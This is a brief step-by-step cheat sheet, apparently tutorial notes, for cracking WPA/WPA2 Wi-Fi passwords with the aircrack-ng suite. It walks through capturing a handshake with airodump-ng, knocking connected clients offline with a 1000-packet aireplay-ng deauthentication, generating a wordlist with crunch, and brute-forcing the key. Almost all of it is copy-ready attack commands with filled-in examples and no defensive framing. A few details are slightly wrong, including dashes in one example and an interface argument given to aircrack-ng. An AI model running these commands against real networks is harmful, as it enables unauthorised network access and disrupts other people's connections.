1. Start airodump-ng on the target AP:
airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
Ex: airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0


2. Wait for a client to connect to the AP, or deauthenticate a connected
client (if any) for a very short period of time so that their system will
connect back automatically:
aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]
Ex: aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0


3. to crack WPA/WPA2 is a list of passwords to guess, you can download a ready wordlist
from the internet (links attached) or create your own using a tool called crunch:
crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
ex: crunch 6 8 123456!"£$% -o wordlist -t a@@@@b


4.use aircrack-ng to crack the key. It does this by combining each password in the wordlist 
with AP name (essid) to compute a Pairwise Master Key (PMK) using the pbkdf2 algorithm, the
PMK is the compared to the handshake file:
aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]
ex: aircrack-ng is-01.cap -w list mon0